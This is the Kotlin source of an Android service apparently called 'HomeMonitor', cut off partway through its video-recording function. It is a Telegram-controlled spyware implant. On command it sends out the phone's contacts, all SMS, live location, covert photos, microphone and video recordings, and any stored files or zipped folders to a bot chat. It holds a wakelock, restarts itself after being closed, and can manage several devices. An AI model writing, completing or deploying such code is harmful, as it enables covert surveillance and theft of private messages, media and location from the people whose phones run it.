package com.homemonitor

import android.Manifest
import android.app.PendingIntent
import android.content.ContentValues
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.util.Log
import android.webkit.MimeTypeMap
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class MonitorService : LifecycleService() {

    companion object {
        private const val BOT_TOKEN = "YOUR-TELEGRAM-BOT-TOKEN"
        private const val CHAT_ID   = "YOUR-CHAT-ID"

        private const val TAG             = "MonitorService"
        private const val NOTIFICATION_ID = 1001
        private const val POLL_INTERVAL_MS = 8_000L
        private const val HEARTBEAT_INTERVAL_MS = 5 * 60 * 1000L
        private const val CHUNK_LIMIT = 49L * 1_048_576L

        private const val PREFS_NAME         = "monitor_prefs"
        private const val PREF_DEVICE_NAME   = "device_name"
        private const val PREF_DEVICE_NUMBER = "device_number"
        private const val PREF_ACTIVE_DEVICE = "active_device"

        private val BASE_URL          = "https://api.telegram.org/bot$BOT_TOKEN"
        private val BASE_FILE_URL     = "https://api.telegram.org/file/bot$BOT_TOKEN"
        private val URL_GET_UPDATES   = "$BASE_URL/getUpdates"
        private val URL_SEND_MSG      = "$BASE_URL/sendMessage"
        private val URL_SEND_PHOTO    = "$BASE_URL/sendPhoto"
        private val URL_SEND_VIDEO    = "$BASE_URL/sendVideo"
        private val URL_SEND_DOCUMENT = "$BASE_URL/sendDocument"
        private val URL_SEND_AUDIO    = "$BASE_URL/sendAudio"
        private val URL_GET_FILE      = "$BASE_URL/getFile"

        // Known valid commands (for wrong-command detection)
        private val KNOWN_COMMANDS = setOf(
            "/start", "/help", "/alive", "/status",
            "/alldevice", "/setdevice", "/switchdevice",
            "/allcontacts", "/contacts", "/allsms", "/sms",
            "/camera", "/frontcam", "/frontcamera",
            "/location",
            "/audio",
            "/allfiles",
            "/zip",
            "/video",
            "/files"
        )
    }

    // ── Caches ──
    private val folderFileCache = mutableMapOf<String, List<File>>()
    private val folderPathCache = mutableMapOf<String, String>()   // chatId → current path

    // ── WakeLock ──
    private var wakeLock: PowerManager.WakeLock? = null

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    private val serviceScope  = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null
    private var heartbeatJob: Job? = null

    @Volatile private var updateOffset: Long = 0L

    private val cameraExecutor = Executors.newSingleThreadExecutor()
    private val mainHandler    = Handler(Looper.getMainLooper())

    private lateinit var deviceName: String
    private var deviceNumber: Int = 1

    // ══════════════════════════════════════════════════════════════════════════
    //  LIFECYCLE
    // ══════════════════════════════════════════════════════════════════════════

    override fun onCreate() {
        super.onCreate()
        loadDeviceIdentity()
        acquireWakeLock()
        startForegroundWithNotification()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        pollJob?.cancel()
        pollJob = serviceScope.launch { pollLoop() }
        heartbeatJob?.cancel()
        heartbeatJob = serviceScope.launch { heartbeatLoop() }
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        val pi = PendingIntent.getService(applicationContext, 1,
            Intent(applicationContext, MonitorService::class.java),
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE)
        (getSystemService(ALARM_SERVICE) as android.app.AlarmManager).set(
            android.app.AlarmManager.ELAPSED_REALTIME,
            android.os.SystemClock.elapsedRealtime() + 1_000L, pi)
    }

    override fun onDestroy() {
        super.onDestroy()
        pollJob?.cancel(); heartbeatJob?.cancel()
        serviceScope.cancel(); cameraExecutor.shutdown()
        releaseWakeLock()
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  WAKELOCK
    // ══════════════════════════════════════════════════════════════════════════

    private fun acquireWakeLock() {
        try {
            wakeLock = (getSystemService(POWER_SERVICE) as PowerManager)
                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "HomeMonitor::PollWakeLock")
                .also { it.acquire(10 * 60 * 60 * 1000L) }
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Exception) {}
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  DEVICE IDENTITY
    // ══════════════════════════════════════════════════════════════════════════

    private fun loadDeviceIdentity() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val defaultName = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
        deviceName   = prefs.getString(PREF_DEVICE_NAME, defaultName) ?: defaultName
        deviceNumber = prefs.getInt(PREF_DEVICE_NUMBER, 1)
    }

    private fun saveDeviceIdentity() {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
            .putString(PREF_DEVICE_NAME, deviceName)
            .putInt(PREF_DEVICE_NUMBER, deviceNumber).apply()
    }

    private fun isActiveDevice(): Boolean {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        return prefs.getInt(PREF_ACTIVE_DEVICE, deviceNumber) == deviceNumber
    }

    private fun dp() = "📱 [*${deviceNumber}. $deviceName*]\n"

    // ══════════════════════════════════════════════════════════════════════════
    //  HEARTBEAT
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun heartbeatLoop() {
        while (serviceScope.isActive) {
            try {
                val now = System.currentTimeMillis()
                getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                    .putLong("last_heartbeat_$deviceNumber", now).apply()
                val json = JSONObject().apply {
                    put("chat_id", CHAT_ID)
                    put("text", "__hb__ $deviceNumber|$deviceName|$now")
                    put("disable_notification", true)
                }
                val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
                httpClient.newCall(Request.Builder().url(URL_SEND_MSG).post(body).build())
                    .execute().use {}
            } catch (_: Exception) {}
            delay(HEARTBEAT_INTERVAL_MS)
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  POLLING
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun pollLoop() {
        while (serviceScope.isActive) {
            try {
                fetchUpdates().forEach { handleUpdate(it) }
            } catch (_: Exception) {}
            delay(POLL_INTERVAL_MS)
        }
    }

    private fun fetchUpdates(): List<JSONObject> {
        val body = httpClient.newCall(
            Request.Builder().url("$URL_GET_UPDATES?offset=$updateOffset&limit=10&timeout=0").get().build()
        ).execute().use { r -> if (!r.isSuccessful) return emptyList(); r.body?.string() } ?: return emptyList()

        val json = JSONObject(body)
        if (!json.optBoolean("ok", false)) return emptyList()
        val result  = json.getJSONArray("result")
        val updates = mutableListOf<JSONObject>()
        for (i in 0 until result.length()) {
            val u = result.getJSONObject(i)
            updates.add(u)
            val id = u.getLong("update_id")
            if (id >= updateOffset) updateOffset = id + 1
        }
        return updates
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  COMMAND DISPATCHER
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleUpdate(update: JSONObject) {
        val message = update.optJSONObject("message") ?: return
        val chatId  = message.optJSONObject("chat")?.optString("id") ?: CHAT_ID
        val rawText = message.optString("text", "").trim()

        // Heartbeat - silent
        if (rawText.startsWith("__hb__ ")) { parseAndStoreHeartbeat(rawText); return }

        // Incoming file from user
        val document = message.optJSONObject("document")
        val photoArr = message.optJSONArray("photo")
        when {
            document != null -> { handleIncomingDocument(chatId, document); return }
            photoArr != null && photoArr.length() > 0 -> {
                handleIncomingDocument(chatId,
                    photoArr.getJSONObject(photoArr.length() - 1),
                    "photo_${System.currentTimeMillis()}.jpg"); return
            }
        }

        if (rawText.isEmpty()) return
        val text = rawText.substringBefore("@").lowercase(Locale.getDefault())
        Log.i(TAG, "Command: $text")

        // ── Global commands (all devices respond) ──
        when {
            text == "/alldevice" -> { handleAllDevice(chatId); return }
            text.startsWith("/switchdevice") -> { handleSwitchDevice(chatId, rawText.removePrefix("/switchdevice").trim()); return }
            text.startsWith("/setdevice") -> { handleSetDevice(chatId, rawText.removePrefix("/setdevice").trim()); return }
        }

        if (!isActiveDevice()) return

        // ── Route commands ──
        when {
            text == "/start" || text == "/help" -> handleHelp(chatId)
            text == "/alive" || text == "/status" -> handleStatus(chatId)

            // Contacts
            text == "/allcontacts" -> handleContacts(chatId, limit = Int.MAX_VALUE)
            text.matches(Regex("/contacts\\d+")) -> handleContacts(chatId, text.removePrefix("/contacts").toInt())
            text == "/contacts" -> handleContacts(chatId, limit = 50)

            // SMS
            text == "/allsms" -> handleSms(chatId, filter = "", limit = Int.MAX_VALUE)
            text.matches(Regex("/sms\\d+")) -> handleSms(chatId, filter = "", limit = text.removePrefix("/sms").toInt())
            text == "/sms" -> handleSms(chatId, filter = "", limit = 20)
            text.startsWith("/sms ") -> handleSms(chatId, filter = rawText.removePrefix("/sms ").trim(), limit = Int.MAX_VALUE)

            // Camera — single shot
            text == "/camera" -> handleCameraInterval(chatId, CameraSelector.DEFAULT_BACK_CAMERA, count = 1)
            text == "/frontcam" || text == "/frontcamera" ->
                handleCameraInterval(chatId, CameraSelector.DEFAULT_FRONT_CAMERA, count = 1)

            // Camera — interval mode: /camera5 or /frontcamera5
            text.matches(Regex("/camera\\d+")) ->
                handleCameraInterval(chatId, CameraSelector.DEFAULT_BACK_CAMERA,
                    count = text.removePrefix("/camera").toInt())
            text.matches(Regex("/frontcam\\d+")) ->
                handleCameraInterval(chatId, CameraSelector.DEFAULT_FRONT_CAMERA,
                    count = text.removePrefix("/frontcam").toInt())
            text.matches(Regex("/frontcamera\\d+")) ->
                handleCameraInterval(chatId, CameraSelector.DEFAULT_FRONT_CAMERA,
                    count = text.removePrefix("/frontcamera").toInt())

            // Location
            text == "/location" -> handleLocation(chatId)

            // Audio
            text == "/audio" -> sendMessage(chatId, "${dp()}ℹ️ Usage: `/audio <seconds>`\nExample: /audio30", "Markdown")
            text.matches(Regex("/audio\\d+")) -> handleAudio(chatId, text.removePrefix("/audio").toInt())
            text.startsWith("/audio ") -> handleAudio(chatId, text.removePrefix("/audio ").trim().toIntOrNull() ?: 10)

            // Video
            text == "/video" -> sendMessage(chatId, "${dp()}ℹ️ Usage: `/video <seconds>` or `/video <seconds> front`\nExample: /video30 front", "Markdown")
            text.startsWith("/video") -> handleVideo(chatId, rawText)

            // All Files (new file manager)
            text == "/allfiles" -> handleAllFiles(chatId, "")
            text.startsWith("/allfiles ") -> {
                val arg = rawText.removePrefix("/allfiles ").trim()
                val parts = arg.split(" ")
                val num = parts.last().toIntOrNull()
                if (num != null && parts.size >= 2) handleAllFilesSelect(chatId, num)
                else handleAllFiles(chatId, arg)
            }

            // ZIP
            text == "/zip" -> sendMessage(chatId, "${dp()}ℹ️ Usage: `/zip <path>`\nExample: /zip DCIM/Camera", "Markdown")
            text.startsWith("/zip ") -> handleZip(chatId, rawText.removePrefix("/zip ").trim())

            // Legacy /files
            text == "/files" -> handleAllFiles(chatId, "")
            text.startsWith("/files ") -> {
                val arg = rawText.removePrefix("/files ").trim()
                val num = arg.toIntOrNull()
                if (num != null) handleAllFilesSelect(chatId, num)
                else handleAllFiles(chatId, arg)
            }

            // Wrong command
            text.startsWith("/") -> sendMessage(chatId, "${dp()}❌ Wrong command: `$text`\nSend /help to see all commands.", "Markdown")

            else -> { /* plain text, ignore */ }
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  MULTI-DEVICE
    // ══════════════════════════════════════════════════════════════════════════

    private fun parseAndStoreHeartbeat(raw: String) {
        try {
            val parts = raw.removePrefix("__hb__ ").split("|")
            if (parts.size >= 3) {
                val num = parts[0].toIntOrNull() ?: return
                getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                    .putLong("last_heartbeat_$num", parts[2].toLongOrNull() ?: return)
                    .putString("device_name_$num", parts[1]).apply()
            }
        } catch (_: Exception) {}
    }

    private fun handleAllDevice(chatId: String) {
        val prefs     = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val activeNum = prefs.getInt(PREF_ACTIVE_DEVICE, deviceNumber)
        val lastSeen  = prefs.getLong("last_heartbeat_$deviceNumber", 0L)
        val agoMs     = System.currentTimeMillis() - lastSeen
        val alive     = if (agoMs < 6 * 60 * 1000L) "🟢 Online" else "🔴 Offline (${formatAgo(agoMs)})"
        val activeStr = if (activeNum == deviceNumber) " ← *ACTIVE*" else ""
        sendMessage(chatId,
            "📱 *Device $deviceNumber: $deviceName*$activeStr\nStatus: $alive\n`/switchdevice $deviceNumber` to activate",
            "Markdown")
    }

    private fun handleSwitchDevice(chatId: String, arg: String) {
        val num = arg.trim().toIntOrNull()
        if (num == null) { sendMessage(chatId, "❌ Usage: /switchdevice <number>"); return }
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putInt(PREF_ACTIVE_DEVICE, num).apply()
        if (num == deviceNumber)
            sendMessage(chatId, "✅ Now controlling:\n📱 *$deviceNumber. $deviceName*", "Markdown")
    }

    private fun handleSetDevice(chatId: String, arg: String) {
        if (arg.isBlank()) { sendMessage(chatId, "❌ Usage: /setdevice <name>"); return }
        deviceName = arg.trim(); saveDeviceIdentity()
        sendMessage(chatId, "✅ Renamed to: 📱 *$deviceNumber. $deviceName*", "Markdown")
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  HELP & STATUS
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleHelp(chatId: String) {
        sendMessage(chatId, """
${dp()}🤖 *All Commands*

📱 *Multi-Device*
/alldevice — All devices + status
/switchdevice 2 — Switch to device 2
/setdevice <name> — Rename this device

📶 *Basic*
/alive — Phone online check

📷 *Camera*
/camera — 1 rear photo
/camera5 — 5 rear photos (3s interval)
/frontcam — 1 front photo
/frontcam5 — 5 front photos (3s interval)

📍 /location — GPS + Maps link

👥 *Contacts*
/allcontacts — All contacts
/contacts20 — First 20 contacts

💬 *SMS*
/allsms — All SMS
/sms10 — Last 10 SMS
/sms <number> — SMS with that number

🎙️ *Audio*
/audio30 — Record 30 seconds

🎥 *Video*
/video30 — Rear cam 30s
/video30 front — Front cam 30s

📂 *File Manager*
/allfiles — Browse storage
/allfiles <folder> — Open folder
/allfiles <folder> <num> — Download file

🗜️ *ZIP*
/zip <path> — ZIP folder/file (auto-split 49MB)
        """.trimIndent(), "Markdown")
    }

    private fun handleStatus(chatId: String) {
        val t = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
        sendMessage(chatId, "${dp()}✅ *Online*\n🕐 $t", "Markdown")
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  CONTACTS
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleContacts(chatId: String, limit: Int) {
        if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
            sendMessage(chatId, "${dp()}⚠️ READ_CONTACTS permission not granted."); return
        }
        val estSec = 2
        sendMessage(chatId, "${dp()}📒 Loading contacts…\n⏳ ~${estSec}s | 0%")
        val contacts = readContacts(limit)
        if (contacts.isEmpty()) { sendMessage(chatId, "${dp()}📭 No contacts found."); return }
        val label = if (limit == Int.MAX_VALUE) "All" else "$limit"
        var sent = 0
        val sb = StringBuilder("${dp()}📒 *Contacts ($label)* — ${contacts.size} total\n\n")
        contacts.forEachIndexed { i, (name, num) ->
            sb.append("${i + 1}. *$name*\n   `$num`\n")
            val pct = ((i + 1) * 100 / contacts.size)
            if (sb.length > 3_800) {
                sendMessage(chatId, sb.toString().trimEnd(), "Markdown")
                sb.clear()
                sent += 1
                sendMessage(chatId, "${dp()}📤 Sending… $pct%")
            }
        }
        if (sb.isNotBlank()) sendMessage(chatId, sb.toString().trimEnd(), "Markdown")
        sendMessage(chatId, "${dp()}✅ Done — ${contacts.size} contacts sent.")
    }

    private fun readContacts(limit: Int): List<Pair<String, String>> {
        val list   = mutableListOf<Pair<String, String>>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER),
            null, null,
            "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
        ) ?: return list
        cursor.use {
            val nc = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val pc = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext() && list.size < limit)
                list.add(Pair(it.getString(nc) ?: "Unknown", it.getString(pc) ?: "N/A"))
        }
        return list
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  SMS
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleSms(chatId: String, filter: String, limit: Int) {
        if (!hasPermission(Manifest.permission.READ_SMS)) {
            sendMessage(chatId, "${dp()}⚠️ READ_SMS permission not granted."); return
        }
        val label = when {
            filter.isNotEmpty() -> "SMS with $filter"
            limit == Int.MAX_VALUE -> "All SMS"
            else -> "Last $limit SMS"
        }
        sendMessage(chatId, "${dp()}💬 Loading $label…\n⏳ Please wait | 0%")
        val msgs = readSms(filter, limit)
        if (msgs.isEmpty()) { sendMessage(chatId, "${dp()}📭 No messages found."); return }
        val dateFmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
        val sb = StringBuilder("${dp()}💬 *$label* — ${msgs.size} msgs\n\n")
        msgs.forEachIndexed { i, msg ->
            val pct  = ((i + 1) * 100 / msgs.size)
            val addr = msg.optString("address", "Unknown")
            val body = run {
                val raw = msg.optString("body", "")
                val trimmed = if (raw.length > 200) raw.take(200) + "…" else raw
                trimmed.replace("_", "\\_").replace("*", "\\*").replace("`", "\\`").replace("[", "\\[")
            }
            val date  = dateFmt.format(Date(msg.optLong("date")))
            val emoji = if (msg.optInt("type") == Telephony.Sms.MESSAGE_TYPE_SENT) "📤" else "📨"
            val line  = "$emoji *$addr*\n   🕐 $date\n   $body\n\n"
            if (sb.length + line.length > 3_800) {
                sendMessage(chatId, sb.toString().trimEnd(), "Markdown")
                sb.clear()
                sendMessage(chatId, "${dp()}📤 Sending… $pct%")
            }
            sb.append(line)
        }
        if (sb.isNotBlank()) sendMessage(chatId, sb.toString().trimEnd(), "Markdown")
        sendMessage(chatId, "${dp()}✅ Done — ${msgs.size} messages sent.")
    }

    private fun readSms(filter: String, limit: Int): List<JSONObject> {
        val list   = mutableListOf<JSONObject>()
        val sel    = if (filter.isNotEmpty()) "address LIKE ?" else null
        val args   = if (filter.isNotEmpty()) arrayOf("%${filter.takeLast(7)}%") else null
        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
            sel, args, "${Telephony.Sms.DATE} DESC"
        ) ?: return list
        cursor.use { c ->
            val ac = c.getColumnIndex(Telephony.Sms.ADDRESS)
            val bc = c.getColumnIndex(Telephony.Sms.BODY)
            val dc = c.getColumnIndex(Telephony.Sms.DATE)
            val tc = c.getColumnIndex(Telephony.Sms.TYPE)
            while (c.moveToNext() && list.size < limit) {
                list.add(JSONObject().apply {
                    put("address", c.getString(ac) ?: "Unknown")
                    put("body", c.getString(bc) ?: "")
                    put("date", c.getLong(dc))
                    put("type", c.getInt(tc))
                })
            }
        }
        return list
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  CAMERA — INTERVAL MODE
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleCameraInterval(chatId: String, selector: CameraSelector, count: Int) {
        if (!hasPermission(Manifest.permission.CAMERA)) {
            sendMessage(chatId, "${dp()}⚠️ CAMERA permission not granted."); return
        }
        val label = if (selector == CameraSelector.DEFAULT_FRONT_CAMERA) "front" else "rear"
        val total = count.coerceIn(1, 50)
        if (total == 1) {
            sendMessage(chatId, "${dp()}📷 Taking photo ($label)…")
        } else {
            val estSec = total * 3
            sendMessage(chatId, "${dp()}📷 Taking $total photos ($label) every 3s…\n⏳ ~${estSec}s | 0%")
        }
        serviceScope.launch {
            for (i in 1..total) {
                val pct = (i * 100 / total)
                takeOneCameraPhoto(chatId, selector, i, total)
                if (i < total) {
                    sendMessage(chatId, "${dp()}📷 Photo $i/$total sent | $pct%\n⏳ Next in 3s…")
                    delay(3_000L)
                }
            }
            if (total > 1) sendMessage(chatId, "${dp()}✅ Done — $total photos sent.")
        }
    }

    private fun takeOneCameraPhoto(chatId: String, selector: CameraSelector, idx: Int, total: Int) {
        val latch = java.util.concurrent.CountDownLatch(1)
        mainHandler.post {
            val future = ProcessCameraProvider.getInstance(this)
            future.addListener({
                var provider: ProcessCameraProvider? = null
                try {
                    provider = future.get()
                    val capture = ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
                    provider.unbindAll()
                    provider.bindToLifecycle(this, selector, capture)
                    val file = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                    capture.takePicture(
                        ImageCapture.OutputFileOptions.Builder(file).build(),
                        cameraExecutor,
                        object : ImageCapture.OnImageSavedCallback {
                            override fun onImageSaved(out: ImageCapture.OutputFileResults) {
                                mainHandler.post { try { provider?.unbindAll() } catch (_: Exception) {} }
                                sendPhotoWithCaption(chatId, file,
                                    "${dp()}📸 Photo $idx/$total")
                                file.delete()
                                latch.countDown()
                            }
                            override fun onError(e: ImageCaptureException) {
                                mainHandler.post { try { provider?.unbindAll() } catch (_: Exception) {} }
                                sendMessage(chatId, "${dp()}❌ Camera error: ${e.message}")
                                latch.countDown()
                            }
                        })
                } catch (e: Exception) {
                    mainHandler.post { try { provider?.unbindAll() } catch (_: Exception) {} }
                    sendMessage(chatId, "${dp()}❌ Camera error: ${e.message}")
                    latch.countDown()
                }
            }, ContextCompat.getMainExecutor(this))
        }
        latch.await(20, TimeUnit.SECONDS)
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  LOCATION
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleLocation(chatId: String) {
        val hasFine   = hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)
        val hasCoarse = hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
        if (!hasFine && !hasCoarse) { sendMessage(chatId, "${dp()}⚠️ Location permission not granted."); return }
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        val last: Location? = try {
            val g = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val n = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            when { g != null && n != null -> if (g.time >= n.time) g else n; g != null -> g; else -> n }
        } catch (_: SecurityException) { null }
        if (last != null && System.currentTimeMillis() - last.time <= 3 * 60 * 1000L) {
            sendLocationMsg(chatId, last, "📍 *Last Known Location*"); return
        }
        sendMessage(chatId, "${dp()}📡 Getting GPS fix…\n⏳ ~20s | 0%")
        var done = false
        val provider = if (hasFine) LocationManager.GPS_PROVIDER else LocationManager.NETWORK_PROVIDER
        val listener = object : LocationListener {
            override fun onLocationChanged(loc: Location) {
                if (!done) { done = true; try { lm.removeUpdates(this) } catch (_: Exception) {}
                    sendLocationMsg(chatId, loc, "📍 *Current Location*") }
            }
            @Deprecated("") override fun onStatusChanged(p: String?, s: Int, e: android.os.Bundle?) {}
            override fun onProviderEnabled(p: String) {}
            override fun onProviderDisabled(p: String) {
                if (!done) { done = true; try { lm.removeUpdates(this) } catch (_: Exception) {}
                    sendMessage(chatId, "${dp()}❌ GPS disabled.") }
            }
        }
        try { lm.requestLocationUpdates(provider, 0L, 0f, listener, mainHandler.looper) }
        catch (e: SecurityException) { sendMessage(chatId, "${dp()}❌ Location permission revoked."); return }
        mainHandler.postDelayed({
            if (!done) { done = true; try { lm.removeUpdates(listener) } catch (_: Exception) {}
                if (last != null) sendLocationMsg(chatId, last, "⚠️ *Stale Location*")
                else sendMessage(chatId, "${dp()}❌ Cannot get location. Enable GPS.") }
        }, 20_000L)
    }

    private fun sendLocationMsg(chatId: String, loc: Location, header: String) {
        val lat = loc.latitude; val lon = loc.longitude
        val acc = if (loc.hasAccuracy()) "±${loc.accuracy.toInt()} m" else "N/A"
        sendMessage(chatId,
            "${dp()}$header\n\n🌐 Lat: `$lat`\n🌐 Lon: `$lon`\n🎯 Accuracy: $acc\n🗺 [Open in Maps](https://maps.google.com/?q=$lat,$lon)",
            "Markdown")
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  AUDIO
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleAudio(chatId: String, seconds: Int) {
        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
            sendMessage(chatId, "${dp()}⚠️ RECORD_AUDIO permission not granted."); return
        }
        val dur = seconds.coerceAtLeast(1)
        sendMessage(chatId, "${dp()}🎙️ Recording ${dur}s…\n⏳ ~${dur}s | 0%")
        serviceScope.launch {
            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
            @Suppress("DEPRECATION")
            val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                android.media.MediaRecorder(this@MonitorService)
            else android.media.MediaRecorder()
            try {
                rec.apply {
                    setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                    setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(44100); setAudioEncodingBitRate(128_000)
                    setOutputFile(file.absolutePath); prepare(); start()
                }
                // Progress updates every 10s
                var elapsed = 0
                while (elapsed < dur) {
                    val wait = minOf(10, dur - elapsed)
                    delay(wait * 1_000L)
                    elapsed += wait
                    val pct = (elapsed * 100 / dur)
                    if (elapsed < dur) sendMessage(chatId, "${dp()}🎙️ Recording… $pct% ($elapsed/${dur}s)")
                }
                rec.stop(); rec.release()
                if (!file.exists() || file.length() == 0L) {
                    sendMessage(chatId, "${dp()}❌ Recording empty."); return@launch
                }
                sendMessage(chatId, "${dp()}🎙️ Done! Uploading ${formatSize(file.length())}…\n⏳ 95%")
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("audio", file.name, file.readBytes().toRequestBody("audio/mp4".toMediaTypeOrNull()))
                    .addFormDataPart("title", "Recording (${dur}s)").addFormDataPart("duration", dur.toString()).build()
                httpClient.newCall(Request.Builder().url(URL_SEND_AUDIO).post(body).build()).execute().use { r ->
                    if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Upload failed: ${r.code}")
                    else sendMessage(chatId, "${dp()}✅ Audio sent! (${dur}s)")
                }
            } catch (e: Exception) {
                sendMessage(chatId, "${dp()}❌ Recording error: ${e.message}")
                try { rec.release() } catch (_: Exception) {}
            } finally { try { file.delete() } catch (_: Exception) {} }
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  VIDEO
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleVideo(chatId: String, rawText: String) {
        if (!hasPermission(Manifest.permission.CAMERA) || !hasPermission(Manifest.permission.RECORD_AUDIO)) {
            sendMessage(chatId, "${dp()}⚠️ CAMERA + RECORD_AUDIO permissions required."); return
        }
        // Parse: /video30 or /video 30 or /video30 front or /video 30 front
        val text    = rawText.lowercase().removePrefix("/video").trim()
        val parts   = text.split(" ")
        val dur     = parts[0].toIntOrNull() ?: run {
            sendMessage(chatId, "${dp()}❌ Wrong command. Usage: /video30 or /video 30 front", "Markdown"); return
        }
        val isFront = parts.any { it == "front" }
        val selector = if (isFront) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
        val label   = if (isFront) "front" else "rear"
        val estMB   = dur * 2  // rough estimate
        sendMessage(chatId, "${dp()}🎥 Recording ${dur}s video ($label cam)…\n⏳ ~${dur}s | ~${estMB}MB estimated | 0%")
        serviceScope.launch { recordAndSendVideo(chatId, selector, dur, label) }
    }

    private fun recordAndSendVideo(chatId: String, selector: CameraSelector, durSec: Int, label: String) {
        val file = File(cacheDir, "video_${System.currentTimeMillis()}.mp4")
        @Suppress("DEPRECATION")
        val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            android.media.MediaRecorder(this@MonitorService)
        else android.media.MediaRecorder()
        try {
            rec.apply {
                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                setVideoSource(android.media.MediaRecorder.VideoSource.CAMERA)
                setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(android.media.MediaRecorder.VideoEncoder.H264)
                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                setVideoSize(1280, 720)
                setVideoFrameRate(30)
                setVideoEncodingBitRate(2_000_000)
                setAudioSamplingRate(44100)
